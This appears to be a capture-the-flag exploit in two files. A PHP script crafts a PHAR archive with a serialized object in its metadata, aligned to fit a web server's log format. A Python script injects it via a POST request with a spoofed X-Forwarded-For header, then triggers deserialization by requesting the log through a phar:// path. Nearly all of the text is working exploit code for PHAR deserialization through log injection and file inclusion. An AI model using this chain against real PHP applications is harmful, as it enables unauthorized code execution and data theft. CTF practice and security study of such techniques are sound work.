exp.php

```
<?php

CLASS FLAG {
    //private $_flag;
    public function __destruct(){
        echo "FLAG: " . $this->_flag;
    } 
}

$ip = "172.17.0.1";
$log = 'Time: ' . date('Y-m-d H:i:s') . ' IP: [' . $ip . '], REQUEST: [], CONTENT: [';
$data_len = strlen($log);

if(!file_exists("./phar.tar")){
    $phar = new PharData(dirname(__FILE__) . "/phar.tar", 0, "phartest", Phar::TAR);
    $phar->startBuffering();
    $o = new FLAG();
    $phar->setMetadata($o);
    $phar->addFromString($log, "test");
    $phar->stopBuffering();

    file_put_contents("./phar.tar", "]\n", FILE_APPEND);
}

$exp = file_get_contents("./phar.tar");
$post_exp = substr($exp, $data_len);
echo rawurlencode($post_exp);

// var_dump(is_dir("phar://./phar.tar"));
//var_dump(is_dir("phar://./../../www/log/127.0.0.1/look_www.log"));
```

exp.py

```
import os
import requests
from urllib.parse import unquote

def execCmd(cmd):
    r = os.popen(cmd)
    text = r.read()
    r.close()
    return text

headers = {
    "X-Forwarded-For": "172.17.0.1"
}

# write evil log file
exp = execCmd("php exp.php")
r = requests.post("http://127.0.0.1:53340/", unquote(exp), headers=headers)
print(r.text)

# exp
r = requests.get("http://127.0.0.1:53340/?log_type=test&file=phar://./log/172.17.0.1/look_www.log")
# r = requests.get("http://testabc.com:10082/?log_type=test&file=phar://./log/127.0.0.1/phar.tar")
print(r.text)
```
